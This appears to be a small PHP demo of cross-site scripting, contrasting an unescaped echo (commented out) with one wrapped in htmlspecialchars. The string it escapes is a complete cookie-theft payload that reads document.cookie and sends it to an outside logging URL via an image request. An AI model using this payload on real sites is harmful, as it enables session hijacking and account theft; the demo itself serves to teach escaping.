<?php
// XSS : No measures
//echo (

// XSS : With measures
echo htmlspecialchars(
'<script type="text/javascript">
console.log(document.cookie);
var img = new Image();
img.src = "http://buribaries.xyz/xss/cookie_log.php?" + document.cookie;
console.log(img.src);
</script>'
);